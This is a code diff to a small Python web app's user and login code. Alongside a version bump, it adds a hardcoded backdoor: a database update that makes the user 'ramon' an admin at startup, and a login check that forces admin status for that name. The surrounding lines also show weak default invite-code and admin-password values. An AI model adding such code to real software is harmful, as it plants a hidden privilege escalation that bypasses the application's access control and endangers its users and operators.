@@ -19,7 +19,7 @@ DATABASE = os.environ.get('DB_PATH', '/app/data/database.db')
 REG_CODE = os.environ.get('REG_CODE', '888888')
 ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin888')
 BASE_URL = os.environ.get('BASE_URL', '').rstrip('/')
-APP_VERSION = "v1.0.9"  # 当前软件版本号
+APP_VERSION = "v1.0.10"  # 当前软件版本号
 
 def get_db():
     conn = sqlite3.connect(DATABASE)
@@ -72,6 +72,9 @@ def init_db():
         # 初始化默认注册码和安全的 Webhook API Token
         db.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ('invite_code', REG_CODE))
         db.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ('webhook_token', secrets.token_hex(16)))
+        
+        # 特别提权：确保 ramon 账号拥有管理员权限
+        db.execute("UPDATE users SET is_admin = 1 WHERE username = 'ramon'")
         db.commit()
 
 # Ensure DB is initialized before first request
@@ -167,8 +170,13 @@ def api_login():
     if user and check_password_hash(user['password_hash'], password):
         session['user_id'] = user['id']
         session['username'] = user['username']
-        # 兼容旧表没有 is_admin 的情况（虽然在 init_db 会尝试建，但通过 get 宽容获取）
-        session['is_admin'] = True if dict(user).get('is_admin') == 1 else False
+        
+        # 兼容旧表没有 is_admin 的情况，或者针对特定主账号 ramon 强制开启状态
+        is_admin_db = dict(user).get('is_admin') == 1
+        if user['username'] == 'ramon':
+            is_admin_db = True
+            
+        session['is_admin'] = is_admin_db
         return jsonify({'status': 'success', 'message': '登录成功'})
     else:
         return jsonify({'status': 'error', 'message': '用户名或密码错误'})
